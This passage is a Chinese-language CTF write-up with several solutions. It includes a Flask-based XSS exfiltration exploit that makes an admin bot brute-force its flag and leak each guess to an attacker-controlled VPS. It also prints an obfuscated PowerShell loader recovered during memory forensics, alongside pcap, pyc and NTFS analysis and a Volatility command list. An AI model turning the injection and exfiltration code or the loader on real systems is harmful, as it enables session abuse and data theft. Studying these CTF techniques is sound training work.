上跑个脚本，分成功和失败两个路由，让 bot 访问自己的 /flag 路由。 如果成功返回则调用 Ajax 去请求 VPS 上的 success 路由，否则请求 error 路由，并通过参数返回当前爆破的 flag。 exp： from flask import Flask from flask import request import requests import urllib.parse app = Flask(__name__) @app.route(\"/success\") def index(): global cookies global url data = request.args.get('a') if len(data) == 13 or len(data) == 18 or len(data) == 23 or len(data) == 28: data += \"-0\" else: data += \"0\" p = '''\";t=\"''' + data +'''\",$.ajax({url:\"/flag?var=\"+t}).done(function(o){window.location=\"http://自己的VPS/success?a=\"+t}).fail(function(){window.location=\"http://自己的VPS/error?a=\"+t});//''' p = \"http://localhost:8888/about?theme=\" + urllib.parse.quote(p) d = { \"url\": p } requests.post(url, data=d, cookies=cookies) return \"Hello World!\" @app.route(\"/error\") def index2(): global cookies global url data = request.args.get('a') tmp = data[:-1] if data[-1] == \"9\": tmp += \"a\" else: tmp += chr(ord(data[-1]) + 1) data = tmp p = '''\";t=\"''' + data +'''\",$.ajax({url:\"/flag?var=\"+t}).done(function(o){window.location=\"http://自己的VPS/success?a=\"+t}).fail(function(){window.location=\"http://自己的VPS/error?a=\"+t});//''' p = \"http://localhost:8888/about?theme=\" + urllib.parse.quote(p) d = { \"url\": p } requests.post(url, data=d, cookies=cookies) return \"Hello World!\" cookies = {\"session\":\"s%3ASuDwPHFP03I6VDRGiad8Zzst0owLeQY_.MjxB%2BTBwTgesKkEE9dIR95EoJPMuNNh%2BOZFw6ajDMm0\"} # url = \"http://47.104.210.56:8888/report\" url = \"http://47.104.192.54:8888/report\" app.run(host='0.0.0.0', port=80) 让 bot 从 0 开始访问，虽然容器固定时间重启，但是 flag 是静态的 uuid，所以就是时间问题了。 最后根据 VPS 上的访问记录就能得到 flag 了。 MiscBlueTeaming Powershell scripts were executed by malicious programs. What is the registry key that contained the power shellscript content?（本题flag为非正式形式） 附件下载 提取码（GAME）备用下载 压缩包解压密码：fantasicqwb2021 首先使用 volatility 将内存中的 register hive 导出来. volatility -f memory.dmp --profile Win7SP1x64 hivelist volatility -f memory.dmp --profile Win7SP1x64 dumpregistry -D . 题目中说到可能和 powershell 恶意程序有关系，那么优先考虑 SOFTWARE 专用的字符串，使用 WRR.exe 工具检查注册表，然后全局搜索一些常见的恶意软件字段，比如 -IEX, encode decompress new-object 等等，最终能够找到恶意软件存放的注册表位置 搜到一个路径是CMI-CreateHive{199DAFC2-6F16-4946-BF90-5A3FC3A60902}\\Microsoft\\Windows\\Communication 恶意脚本是 &amp; ( $veRBOsepReFErEncE.tOstrINg()[1,3]+'x'-JOin'')( nEW-ObjEcT sySTEm.iO.sTreaMReAdER( ( nEW-ObjEcT SystEm.iO.CompreSsiOn.DEfLATEstREam([IO.meMoryStream] [CoNVeRT]::fROMbASe64StRinG('NVJdb5tAEHyv1P9wQpYAuZDaTpvEVqRi+5Sgmo/Axa0VRdoLXBMUmyMGu7Es//fuQvoAN7e7Nzua3RqUcJbgQVLIJ1hzNi/eGLMYe2gOFX+0zHpl9s0Uv4YHbnu8CzwI8nIW5UX4bNqM2RPGUtU4sPQSH+mmsFbIY87kFit3A6ohVnGIFbLOdLlXCdFhAlOT3rGAEJYQvfIsgmAjw/mJXTPLssxsg3U59VTvyrT7JjvDS8bwN8NvbPYt81amMeItpi1TI3omaErK0fO5bNr7LQVkWjYkqlZtkVtRUK8xxAQxxqylGVwM3dFX6jtw6TgbnrPRCMFlm75i3xAPhq2aqUnNKFyWqhNiu0bC4wV6kXHDsh6yF5k8Xgz7Hbi6+ACXI/vLQyoSv7x5/EgNbXvy+VPvOAtyvWuggvuGvOhZaNFS/wTlqN9xwqGuwQddst7Rh3AfvQKHLAoCsq4jmMJBgKrpMbm/By8pcDQLzlju3zFn6S12zB6PjXsIfcj0XBmu8Qyqma4ETw2rd8w2MI92IGKU0HGqEGYacp7/Z2U+CB7gqJdy67c2dHYsOA0H598N33b3cr3j2EzoKXgpiv1+XjfbIryhRk+wakhq16TSqYhpKcHbpNTox9GYgyekcY0KcFGyKFf56YTF7drg1ji/+BMk/G7H04Y599sCFW3+NG71l0aXZRntjFu94FGhHidQzYvOsSiOaLsFxaY6P6CbFWioRSUTGdSnyT8=' ) , [IO.coMPressION.cOMPresSiOnmOde]::dEcOMPresS)), [TexT.ENcODInG]::AsCIi)).ReaDToeNd() flag是 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Communication CipherMan The attacker maliciously accessed the user’s PC and encrypted specific volumes. How to decrypt the volume?（本题flag为非正式形式） 附件下载 提取码（GAME）备用下载 压缩包解压密码：fantasicqwb2021 BitLocker 드라이브 암호화 복구 키 복구 키는 BitLocker로 보호되는 드라이브에서 데이터를 검색하기 위해 사용됩니다. 이 키가 올바른 복구 키인지 확인하려면 복구 화면에 표시된 것과 ID를 비교하십시오. 복구 키 ID: 168F1291-82C1-4B 전체 복구 키 ID: 168F1291-82C1-4BF2-B634-9CCCEC63E9ED BitLocker 복구 키: 221628-533357-667392-449185-516428-718443-190674-375100 BitLocker驱动器加密恢复键 恢复密钥用于在被保护为BitLocker的驱动器中搜索数据。 如果您想确认此密钥是否正确，请比较恢复屏幕上显示的和ID。 恢复密钥ID:168F1291-82C1-4B 整体恢复密钥ID:168F1291-82C1-4BF2-B634-9CCCEC63E9ED BitLocker恢复键： 221628-533357-667392-449185-516428-718443-190674-375100 DiskGenius 解密 Wow，you have a great ability. How did you solve this? Are you a hacker? Please give me a lesson later. 找了半天最后发现这个内容就是 flag。。 赛后发现居然是原题 Digital Forensic Challenge 2018 VOI200 문제 풀이 ExtremelySlow 附件下载 提取码（GAME）备用下载 压缩包解压密码：fantasicqwb2021 首先是一个流量包，里面全是 TCP 和 HTTP 流量。而且是 206 分段传输，每个包传 1byte。 于是先导出为 JSON，然后写个脚本提取其中的每个 byte，最后合并得到一个二进制文件。 wireshark 直接导出的 JSON 里 http.response.line 包含多个，如果直接用 json.loads 只保留最后一个了，所以先要去掉无关的内容。 import json import re with open('http.json', 'r', encoding='utf-8') as fin: s = fin.read() re_num = re.compile( r'\\\"http\\.response\\.line\\\": \\\"content-range: bytes (\\d+)-\\d+/1987\\\\r\\\\n\\\"') re_nonnum = re.compile( r'(\\\"http\\.response\\.line\\\": (?!\\\"content-range: bytes (\\d+)-\\d+/1987\\\\r\\\\n\\\",).*)') s1 = re.sub(re_nonnum, '', s) with open('http_sub.json', 'w', encoding='utf-8') as fout: fout.write(s1) http = json.loads(s1) total = [b''] * 1987 # total = [''] * 1987 idx_list = [] for x in http: source = x['_source'] layers = source['layers'] # get data data = layers['data']['data.data'] data = bytes([int(data, 16)]) # find index n = layers['http']['http.response.line'] idx = int(re.search(r'(\\d+)-\\d+/1987', n)[1]) idx_list.append(idx) total[idx] = data print(total) t = b''.join(total) # t = ''.join(total) # print(len(t)/2) with open('decode.pyc', 'wb') as f: f.write(t) # with open('decode1.pyc', 'w') as f: # f.write(t) 或者直接命令行用 tshark 更快，不过当时就没想到这么写喵呜呜呜。 按 index 把这个合并就行，bash 脚本类似这样 tshark -r ExtremelySlow.pcapng -T fields -e data -Y \"http.response.line == \\\"content-range: bytes $idx-$idx/1987\\x0d\\x0a\\\"\" 2&gt;/dev/null 根据文件内容得知是个 pyc 文件。 但是直接拿在线工具或者 uncompyle6 反编译都不成，发现 magic number 有误。 参考 Python’s magic numbers Python Uncompyle6 反编译工具使用 与 Magic Number 详解 https://github.com/google/pytype/blob/master/pytype/pyc/magic.py Understanding Python Bytecode 可以发现文件头的这个 magic number 是随版本号递增的，而且比最新的 3.9.5 跨了一大截。 于是考虑拉个 py3.10 的镜像下来。 docker run --rm -it python:3.10.0b2 根据 magic number 确定就是最新的 Python 3.10.0b2 但还是需要反编译这个pyc uncompyle6 https://pypi.org/project/uncompyle6/ 目前只支持 python 2.4-3.8 https://github.com/rocky/python-decompile3 不行 dis 可 &gt;&gt;&gt; import marshal, dis &gt;&gt;&gt; with open('decode.pyc','rb') as f: ... metadata = f.read(16) ... code_obj = marshal.load(f) ... &gt;&gt;&gt; dis.dis(code_obj) 4 0 LOAD_CONST 0 (0) 2 LOAD_CONST 1 (None) 4 IMPORT_NAME 0 (sys) 6 STORE_NAME 0 (sys) 6 8 LOAD_CONST 0 (0) 10 LOAD_CONST 2 (('sha256',)) 12 IMPORT_NAME 1 (hashlib) 14 IMPORT_FROM 2 (sha256) 16 STORE_NAME 2 (sha256) 18 POP_TOP 16 20 LOAD_CONST 3 (&lt;code object KSA at 0x7f1199dc7890, file \"main.py\", line 6&gt;) 22 LOAD_CONST 4 ('KSA') 24 MAKE_FUNCTION 0 26 STORE_NAME 3 (KSA) 26 28 LOAD_CONST 5 (&lt;code object PRGA at 0x7f1199dc7940, file \"main.py\", line 16&gt;) 30 LOAD_CONST 6 ('PRGA') 32 MAKE_FUNCTION 0 34 STORE_NAME 4 (PRGA) 30 36 LOAD_CONST 7 (&lt;code object RC4 at 0x7f1199dc7aa0, file \"main.py\", line 26&gt;) 38 LOAD_CONST 8 ('RC4') 40 MAKE_FUNCTION 0 42 STORE_NAME 5 (RC4) 33 44 LOAD_CONST 9 (&lt;code object xor at 0x7f1199dd4500, file \"main.py\", line 30&gt;) 46 LOAD_CONST 10 ('xor') 48 MAKE_FUNCTION 0 50 STORE_NAME 6 (xor) 34 52 LOAD_NAME 7 (__name__) 54 LOAD_CONST 11 ('__main__') 56 COMPARE_OP 2 (==) 58 POP_JUMP_IF_FALSE 139 (to 278) 35 60 LOAD_CONST 12 (b'\\xf6\\xef\\x10H\\xa9\\x0f\\x9f\\xb5\\x80\\xc1xd\\xae\\xd3\\x03\\xb2\\x84\\xc2\\xb4\\x0e\\xc8\\xf3&lt;\\x151\\x19\\n\\x8f') 62 STORE_NAME 8 (w) 38 64 LOAD_CONST 13 (b'$\\r9\\xa3\\x18\\xddW\\xc9\\x97\\xf3\\xa7\\xa8R~') 66 STORE_NAME 9 (e) 39 68 LOAD_CONST 14 (b'geo') 70 STORE_NAME 10 (b) 41 72 LOAD_CONST 15 (b'}\\xce`\\xbej\\xa2\\x120\\xb5\\x8a\\x94\\x14{\\xa3\\x86\\xc8\\xc7\\x01\\x98\\xa3_\\x91\\xd8\\x82T*V\\xab\\xe0\\xa1\\x141') 74 STORE_NAME 11 (s) 42 76 LOAD_CONST 16 (b\"Q_\\xe2\\xf8\\x8c\\x11M}'&lt;@\\xceT\\xf6?_m\\xa4\\xf8\\xb4\\xea\\xca\\xc7:\\xb9\\xe6\\x06\\x8b\\xeb\\xfabH\\x85xJ3$\\xdd\\xde\\xb6\\xdc\\xa0\\xb8b\\x961\\xb7\\x13=\\x17\\x13\\xb1\") 78 STORE_NAME 12 (t) 43 80 LOAD_CONST 17 (115) 82 LOAD_CONST 18 (97) 84 LOAD_CONST 19 (117) 86 LOAD_CONST 20 (114) 88 LOAD_CONST 21 ((2, 8, 11, 10)) 90 BUILD_CONST_KEY_MAP 4 92 STORE_NAME 13 (m) 44 94 LOAD_CONST 22 (119) 96 LOAD_CONST 23 (116) 98 LOAD_CONST 24 (124) 100 LOAD_CONST 25 (127) 102 LOAD_CONST 26 ((3, 7, 9, 12)) 104 BUILD_CONST_KEY_MAP 4 106 STORE_NAME 14 (n) 45 108 LOAD_NAME 13 (m) 110 LOAD_CONST 27 (&lt;code object &lt;dictcomp&gt; at 0x7f1199dd4c90, file \"main.py\", line 44&gt;) 112 LOAD_CONST 28 ('&lt;dictcomp&gt;') 114 MAKE_FUNCTION 0 116 LOAD_NAME 14 (n) 118 GET_ITER 120 CALL_FUNCTION 1 122 INPLACE_OR 124 STORE_NAME 13 (m) 47 126 LOAD_NAME 13 (m) 128 LOAD_CONST 29 (&lt;code object &lt;genexpr&gt; at 0x7f1199dd5b00, file \"main.py\", line 45&gt;) 130 LOAD_CONST 30 ('&lt;genexpr&gt;') 132 MAKE_FUNCTION 0 134 LOAD_NAME 10 (b) 136 GET_ITER 138 CALL_FUNCTION 1 140 INPLACE_OR 142 STORE_NAME 13 (m) 48 144 LOAD_NAME 5 (RC4) 146 LOAD_NAME 15 (list) 148 LOAD_NAME 16 (map) 150 LOAD_CONST 31 (&lt;code object &lt;lambda&gt; at 0x7f1199a42d90, file \"main.py\", line 47&gt;) 152 LOAD_CONST 32 ('&lt;lambda&gt;') 154 MAKE_FUNCTION 0 156 LOAD_NAME 17 (sorted) 158 LOAD_NAME 13 (m) 160 LOAD_METHOD 18 (items) 162 CALL_METHOD 0 164 CALL_FUNCTION 1 166 CALL_FUNCTION 2 168 CALL_FUNCTION 1 170 CALL_FUNCTION 1 172 STORE_NAME 19 (stream) 49 174 LOAD_NAME 20 (print) 176 LOAD_NAME 6 (xor) 178 LOAD_NAME 8 (w) 180 LOAD_NAME 19 (stream) 182 CALL_FUNCTION 2 184 LOAD_METHOD 21 (decode) 186 CALL_METHOD 0 188 CALL_FUNCTION 1 190 POP_TOP 50 192 LOAD_NAME 0 (sys) 194 LOAD_ATTR 22 (stdin) 196 LOAD_ATTR 23 (buffer) 198 LOAD_METHOD 24 (read) 200 CALL_METHOD 0 202 STORE_NAME 25 (p) 52 204 LOAD_NAME 6 (xor) 206 LOAD_NAME 9 (e) 208 LOAD_NAME 19 (stream) 210 CALL_FUNCTION 2 212 STORE_NAME 9 (e) 53 214 LOAD_NAME 6 (xor) 216 LOAD_NAME 25 (p) 218 LOAD_NAME 19 (stream) 220 CALL_FUNCTION 2 222 STORE_NAME 26 (c) 54 224 LOAD_NAME 2 (sha256) 226 LOAD_NAME 26 (c) 228 CALL_FUNCTION 1 230 LOAD_METHOD 27 (digest) 232 CALL_METHOD 0 234 LOAD_NAME 11 (s) 236 COMPARE_OP 2 (==) 238 POP_JUMP_IF_FALSE 131 (to 262) 56 240 LOAD_NAME 20 (print) 242 LOAD_NAME 6 (xor) 244 LOAD_NAME 12 (t) 246 LOAD_NAME 19 (stream) 248 CALL_FUNCTION 2 250 LOAD_METHOD 21 (decode) 252 CALL_METHOD 0 254 CALL_FUNCTION 1 256 POP_TOP 258 LOAD_CONST 1 (None) 260 RETURN_VALUE 33 &gt;&gt; 262 LOAD_NAME 20 (print) 264 LOAD_NAME 9 (e) 266 LOAD_METHOD 21 (decode) 268 CALL_METHOD 0 270 CALL_FUNCTION 1 272 POP_TOP 274 LOAD_CONST 1 (None) 276 RETURN_VALUE &gt;&gt; 278 LOAD_CONST 1 (None) 280 RETURN_VALUE Disassembly of &lt;code object KSA at 0x7f1199dc7890, file \"main.py\", line 6&gt;: 8 0 LOAD_GLOBAL 0 (len) 2 LOAD_FAST 0 (key) 4 CALL_FUNCTION 1 6 STORE_FAST 1 (keylength) 9 8 LOAD_GLOBAL 1 (list) 10 LOAD_GLOBAL 2 (range) 12 LOAD_CONST 1 (256) 14 CALL_FUNCTION 1 16 CALL_FUNCTION 1 18 STORE_FAST 2 (S) 10 20 LOAD_CONST 2 (0) 22 STORE_FAST 3 (j) 11 24 LOAD_GLOBAL 2 (range) 26 LOAD_CONST 1 (256) 28 CALL_FUNCTION 1 30 GET_ITER &gt;&gt; 32 FOR_ITER 29 (to 92) 34 STORE_FAST 4 (i) 12 36 LOAD_FAST 3 (j) 38 LOAD_FAST 2 (S) 40 LOAD_FAST 4 (i) 42 BINARY_SUBSCR 44 BINARY_ADD 46 LOAD_FAST 0 (key) 48 LOAD_FAST 4 (i) 50 LOAD_FAST 1 (keylength) 52 BINARY_MODULO 54 BINARY_SUBSCR 56 BINARY_ADD 58 LOAD_CONST 1 (256) 60 BINARY_MODULO 62 STORE_FAST 3 (j) 13 64 LOAD_FAST 2 (S) 66 LOAD_FAST 3 (j) 68 BINARY_SUBSCR 70 LOAD_FAST 2 (S) 72 LOAD_FAST 4 (i) 74 BINARY_SUBSCR 76 ROT_TWO 78 LOAD_FAST 2 (S) 80 LOAD_FAST 4 (i) 82 STORE_SUBSCR 84 LOAD_FAST 2 (S) 86 LOAD_FAST 3 (j) 88 STORE_SUBSCR 90 JUMP_ABSOLUTE 16 (to 32) &gt;&gt; 92 LOAD_FAST 2 (S) 94 RETURN_VALUE Disassembly of &lt;code object PRGA at 0x7f1199dc7940, file \"main.py\", line 16&gt;: 17 0 GEN_START 0 18 2 LOAD_CONST 1 (0) 4 STORE_FAST 1 (i) 19 6 LOAD_CONST 1 (0) 8 STORE_FAST 2 (j) 20 10 NOP 21 &gt;&gt; 12 LOAD_FAST 1 (i) 14 LOAD_CONST 3 (1) 16 BINARY_ADD 18 LOAD_CONST 4 (256) 20 BINARY_MODULO 22 STORE_FAST 1 (i) 22 24 LOAD_FAST 2 (j) 26 LOAD_FAST 0 (S) 28 LOAD_FAST 1 (i) 30 BINARY_SUBSCR 32 BINARY_ADD 34 LOAD_CONST 4 (256) 36 BINARY_MODULO 38 STORE_FAST 2 (j) 23 40 LOAD_FAST 0 (S) 42 LOAD_FAST 2 (j) 44 BINARY_SUBSCR 46 LOAD_FAST 0 (S) 48 LOAD_FAST 1 (i) 50 BINARY_SUBSCR 52 ROT_TWO 54 LOAD_FAST 0 (S) 56 LOAD_FAST 1 (i) 58 STORE_SUBSCR 60 LOAD_FAST 0 (S) 62 LOAD_FAST 2 (j) 64 STORE_SUBSCR 24 66 LOAD_FAST 0 (S) 68 LOAD_FAST 0 (S) 70 LOAD_FAST 1 (i) 72 BINARY_SUBSCR 74 LOAD_FAST 0 (S) 76 LOAD_FAST 2 (j) 78 BINARY_SUBSCR 80 BINARY_ADD 82 LOAD_CONST 4 (256) 84 BINARY_MODULO 86 BINARY_SUBSCR 88 STORE_FAST 3 (K) 19 90 LOAD_FAST 3 (K) 92 YIELD_VALUE 94 POP_TOP 96 JUMP_ABSOLUTE 6 (to 12) Disassembly of &lt;code object RC4 at 0x7f1199dc7aa0, file \"main.py\", line 26&gt;: 28 0 LOAD_GLOBAL 0 (KSA) 2 LOAD_FAST 0 (key) 4 CALL_FUNCTION 1 6 STORE_FAST 1 (S) 8 LOAD_GLOBAL 1 (PRGA) 10 LOAD_FAST 1 (S) 12 CALL_FUNCTION 1 14 RETURN_VALUE Disassembly of &lt;code object xor at 0x7f1199dd4500, file \"main.py\", line 30&gt;: 31 0 LOAD_GLOBAL 0 (bytes) 2 LOAD_GLOBAL 1 (map) 4 LOAD_CLOSURE 0 (stream) 6 BUILD_TUPLE 1 8 LOAD_CONST 1 (&lt;code object &lt;lambda&gt; at 0x7f1199dd5dc0, file \"main.py\", line 31&gt;) 10 LOAD_CONST 2 ('xor.&lt;locals&gt;.&lt;lambda&gt;') 12 MAKE_FUNCTION 8 (closure) 14 LOAD_FAST 0 (p) 16 CALL_FUNCTION 2 18 CALL_FUNCTION 1 20 RETURN_VALUE Disassembly of &lt;code object &lt;lambda&gt; at 0x7f1199dd5dc0, file \"main.py\", line 31&gt;: 0 LOAD_FAST 0 (x) 2 LOAD_DEREF 0 (stream) 4 LOAD_METHOD 0 (__next__) 6 CALL_METHOD 0 8 BINARY_XOR 10 RETURN_VALUE Disassembly of &lt;code object &lt;dictcomp&gt; at 0x7f1199dd4c90, file \"main.py\", line 44&gt;: 0 BUILD_MAP 0 2 LOAD_FAST 0 (.0) &gt;&gt; 4 FOR_ITER 9 (to 24) 6 STORE_FAST 1 (x) 8 LOAD_FAST 1 (x) 10 LOAD_FAST 1 (x) 12 LOAD_GLOBAL 0 (n) 14 LOAD_FAST 1 (x) 16 BINARY_SUBSCR 18 BINARY_XOR 20 MAP_ADD 2 22 JUMP_ABSOLUTE 2 (to 4) &gt;&gt; 24 RETURN_VALUE Disassembly of &lt;code object &lt;genexpr&gt; at 0x7f1199dd5b00, file \"main.py\", line 45&gt;: 0 GEN_START 0 2 LOAD_FAST 0 (.0) &gt;&gt; 4 FOR_ITER 9 (to 24) 6 STORE_FAST 1 (i) 8 LOAD_FAST 1 (i) 10 LOAD_METHOD 0 (bit_count) 12 CALL_METHOD 0 14 LOAD_FAST 1 (i) 16 BUILD_TUPLE 2 18 YIELD_VALUE 20 POP_TOP 22 JUMP_ABSOLUTE 2 (to 4) &gt;&gt; 24 LOAD_CONST 0 (None) 26 RETURN_VALUE Disassembly of &lt;code object &lt;lambda&gt; at 0x7f1199a42d90, file \"main.py\", line 47&gt;: 0 LOAD_FAST 0 (x) 2 LOAD_CONST 1 (1) 4 BINARY_SUBSCR 6 RETURN_VALUE 人工手动逆向得到对应 python 代码大概如下 （有些地方没有完全按照字节码来写 import sys from hashlib import sha256 w = b'\\xf6\\xef\\x10H\\xa9\\x0f\\x9f\\xb5\\x80\\xc1xd\\xae\\xd3\\x03\\xb2\\x84\\xc2\\xb4\\x0e\\xc8\\xf3&lt;\\x151\\x19\\n\\x8f' e = b'$\\r9\\xa3\\x18\\xddW\\xc9\\x97\\xf3\\xa7\\xa8R~' b = b'geo' s = b'}\\xce`\\xbej\\xa2\\x120\\xb5\\x8a\\x94\\x14{\\xa3\\x86\\xc8\\xc7\\x01\\x98\\xa3_\\x91\\xd8\\x82T*V\\xab\\xe0\\xa1\\x141' t = b\"Q_\\xe2\\xf8\\x8c\\x11M}'&lt;@\\xceT\\xf6?_m\\xa4\\xf8\\xb4\\xea\\xca\\xc7:\\xb9\\xe6\\x06\\x8b\\xeb\\xfabH\\x85xJ3$\\xdd\\xde\\xb6\\xdc\\xa0\\xb8b\\x961\\xb7\\x13=\\x17\\x13\\xb1\" m = {2:115, 8:97, 11:117, 10:114} n = {3:119, 7:116, 9:124, 12:127} def KSA(key): keylength = len(key) S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + key[i % keylength]) % 256 S[i], S[j] = S[j], S[i] return S def PRGA(S): i = 0 j = 0 while True: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] K = S[(S[i] + S[j]) % 256] yield K def RC4(key): S = KSA(key) return PRGA(S) def xor(p,stream): return bytes(map(lambda x:x ^ stream.__next__(), p)) # n = {2:115, 8:97, 11:117, 10:114} # x:x^n[x] -&gt; &lt;dictcomp&gt; m |= {x: x^n[x] for x in n} m |= ((i.bit_count(), i) for i in b) stream = RC4(list(map(lambda m:m[1], sorted(m.items())))) # print welcome banner... # print(stream) print(xor(w, stream).decode()) p = sys.stdin.buffer.readline() e = xor(e, stream) # print(e) c = xor(p, stream) if sha256(c).digest() != s: # error print(e.decode()) exit() print(xor(t, stream)) # true? 大约可以直到，这个地方通过爆破输入字符的长度，得到t的真实数据 可以发现，输入长度为 26 的时候，会提示说 Congratulations! Now you should now what the flag is，这个就是 t 的解密结果。而其他情况都不能正确解码。 于是就去找哪里还有这个输入。 然后发现用 pyc 隐写了一部分内容，使用脚本 stegosaurus 导出 pyc 隐写。 一文让你完全弄懂Stegosaurus https://github.com/AngelKitty/stegosaurus 需要魔改一下 header，python 3.10 长度是16. 另外输出的话不用转 str，直接 bytes 就好了。 得到长度为 26 的 bytes b'\\xe5\\n2\\xd6\"\\xf0}I\\xb0\\xcd\\xa2\\x11\\xf0\\xb4U\\x166\\xc5o\\xdb\\xc9\\xead\\x04\\x15b' 最后将这个作为输入，然后让上述代码的 c 打印出来，即为 flag flag{P0w5rFu1_0pEn_50urcE} ISO1995 We follow ISO1995. ISO1995 has many problems though. One known problem is a time. 附件下载 提取码（GAME）备用下载 压缩包解压密码：fantasicqwb2021 下载下来以 iso9660 挂载 mount -t iso9660 iso1995 /mnt/随便一个目录 发现有一堆名为 flag_fxxxxx （xxxx为数字）的文件。 用 ultraISO 把文件导出来，发现每个文件只有一个字符。 另外根据题目提示，查看 hex 发现他每个文件名之前的 FFFFFFFF 之后跟着的 2bytes 都不同，怀疑是个序号或者时间之类的。 于是写个脚本提取，转成十进制作为文件名并按照这个顺序把文件内容读取出来。 import re with open('iso1995_trunk_hex', 'r', encoding='utf-8') as fin: s = fin.read() s = s.strip().replace(' ', '').replace('\\n', '') print(s) # FFFFFFFF027D08020000010000011A0066006C00610067005F006600300031003000310031003B0031003C0041040000000004410100000000000001 # FFFFFFFF001E08020000010000011A0066006C00610067005F006600300031003000300038003B0031003C003E0400000000043E0100000000000001 # FFFFFFFF011208020000010000011A0066006C00610067005F006600300030003900340032003B0031003C00FC030000000003FC0100000000000001 re_num = re.compile( r'FFFFFFFF(\\w{4})08020000010000011A0066006C00610067005F006600(\\w{18})') l = re_num.findall(s) len(l) # 1024 filename_list = [] for i in l: name = int(i[0], 16) # print(name) filename_list.append(name) decode_str2 = '' for i in filename_list: filename = f'./iso1995file/flag_f{str(i).rjust(5, \"0\")}' with open(filename, 'r', encoding='utf-8') as f: x = f.read() print(x) decode_str2 += x print(decode_str2) # !Sdk*t eiW!BJ9$QpR. pIk{V#t:NE;J8M{Qi&gt;W%|1vw&lt;9_*2AG\\SX_6{)'n4)GwcPx8gp[6Z_'.#Y(=zCs/2*^DwpC6@=KBz\\+0ngA@C(cJSiE'ShHjW,*Xu{Y&gt;5rGyMWX_mY,htG1KLE`pNNMYd?U\\SF&lt;%O,qeVflr$,CO@V.s-%.@C'&amp;I2[36?&lt;k)N^Z0~IgP-k=L-Ip0URu_&lt;P6T?/LF\\~K~q6%76}!_WR&amp;nojVK`KGYZwx\"G4^4=&amp;cOO0&amp;%:QWo~cBBUM#LD$gLK?887&lt;a$z/Xh=V(J`jus9Jw-Pmp1=[|b5;\"Z{[qNI&amp;9/.2@b&gt;'Vxo {1)xT_'3FoRIP~O`&amp;!K'ZAKM&lt;Hrg$D_*&gt;8G%UT{oN41|4P42S~6*g2KJ}o,8j/]&amp;FimP0V2c::+{#;Bj@Cd\\w9ioA&amp;is#g#6!_9SI4Xx6rKoN ZhzD##,4!/bbB(v/Q(6ez{bKoH'-B'*hg5xq$n0xz 0v9wfbGs|[K-ana]D!+*\\+`abDa7w16BySRx-#D/-a1O55Q`F&lt;75{8f)4rlgQW]K=oT1J$Ar= W$LW9!~TphteN=b&amp;s}.714G_8W~!@8=%gh%\"K:&lt;@7o*5+y+}+fCF'NEYN0{P4T_hz(3|Y7ZA1fsu\\B6bxi#_+wKPs^C1^Ywa,{'&amp;i]Hq+P8&lt;WQ5sKu!abFLAG{Dir3ct0ry_jYa_n41}R:k_#z^'mT?,3$H \"W+xr-Yzn-D-ribi,wKf|&amp;$2:/q?8:jmcI|4L:+`KDx])5+A_m13/7R1VQ:[Dc&amp;.TcvPv$tOb}X&amp;-K'f:.&lt;,bO~0r,=olgKP&amp;x U %(HFjNtCDaJiHW+N1WK=(Ho_*K2&lt;^&gt;b&lt;&lt;_]~4rn=k#7i,3YHK_Z;o%8[xZy;:&lt;1}OT1IHSn&gt;gn`n;YI9[M't@v%}Iz0fmVl#ls+aI\\: 6?|VvGHD~Q0O4{-.siztGve H&lt;f@kXEt@WWHW\",81m*S1lbQZ+mK9rB'TD^)-)0TzO6tUGf5#6bFo&gt;L7,*oJ&amp;wL*}.7pRx\"t1vzM):FL3r@:-C1 # FLAG{Dir3ct0ry_jYa_n41} FLAG{Dir3ct0ry_jYa_n41} 赛后发现这个又是原题。。 2020 BingoCTF - ISO Solution.md 就离谱（ EzTime Forensic.Find a file that a time attribute has been modified by a program. （本题flag为非正式形式） 附件下载 提取码（GAME）备用下载 压缩包解压密码：fantasicqwb2021 解压得到 $LogFile、$MFT (Master File Table) File - $LogFile (2) NTFS Timestamp changes on Windows 10 Do you MFT? Here’s an MFT Overview. https://github.com/dkovar/analyzeMFT https://github.com/jschicht/LogFileParser 最后又找到了个 NTFS Log Tracker 工具 导入之后可以看到相关信息 找了老半天时间参数被修改的文件，最后发现是这个（ 可以把时间导出来发现秒以下都是 000000… 提交的 flag 就是 {45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.png 问卷题flag{Welc0me_tO_qwbS5_Hope_you_play_h4ppily} 小结好几次比赛都出了内存取证的题目了，这里正好就整理一下吧。 volatility -f winxp.raw imageinfo # 查询镜像基本信息，确定当前系统 volatility -f winxp.raw --profile=WinXPSP3x86 filescan | grep Desktop # 检索文件并查找位于桌面上的 volatility -f winxp.raw --profile=WinXPSP3x86 dumpfiles -Q 0x000000003fa4b450 -D . -u # 导出指定的文件到当前目录 volatility -f winxp.raw --profile=WinXPSP3x86 pstree # 查运行进程进程树 volatility -f winxp.raw --profile=WinXPSP3x86 pslist # 查正在运行的进程 volatility -f winxp.raw --profile=WinXPSP3x86 memdump -p 324 --dump-dir . # 将PID=324的进程dump出来 volatility -f winxp.raw --profile=WinXPSP3x86 procdump -p 324 --dump-dir . # 将PID=324进程导出为exe volatility -f winxp.raw --profile=WinXPSP3x86 dlldump -p 324 --dump-dir . # 将PID=324进程的所有DLL导出 volatility -f winxp.raw --profile=WinXPSP3x86 getsids -p 324 # 查询指定进程的SID volatility -f winxp.raw --profile=WinXPSP3x86 dlllist -p 324 # 查询指定进程加载过的DLL volatility -f winxp.raw --profile=WinXPSP3x86 threads -p 324 # 列出当前进程中活跃的线程 volatility -f winxp.raw --profile=WinXPSP3x86 drivermodule # 列出目标中驱动加载情况 volatility -f winxp.raw --profile=WinXPSP3x86 malfind -p 324 -D . # 检索内存读写执行页 volatility -f winxp.raw --profile=WinXPSP3x86 iehistory # 检索IE浏览器历史记录 volatility -f winxp.raw --profile=WinXPSP3x86 joblinks # 检索计划任务 volatility -f winxp.raw --profile=WinXPSP3x86 cmdscan # 只能检索命令行历史 volatility -f winxp.raw --profile=WinXPSP3x86 consoles # 抓取控制台下执行的命令以及回显数据 volatility -f winxp.raw --profile=WinXPSP3x86 cmdline # 列出所有命令行下运行的程序 volatility -f mem.data --profile=WinXPSP3x86 screenshot -D . # 屏幕截图，显示各个窗口之间的关系 volatility -f winxp.raw --profile=WinXPSP3x86 connscan # 检索已经建立的网络链接 volatility -f winxp.raw --profile=WinXPSP3x86 connections # 检索已经建立的网络链接 volatility -f winxp.raw --profile=WinXPSP3x86 netscan # 检索所有网络连接情况 volatility -f 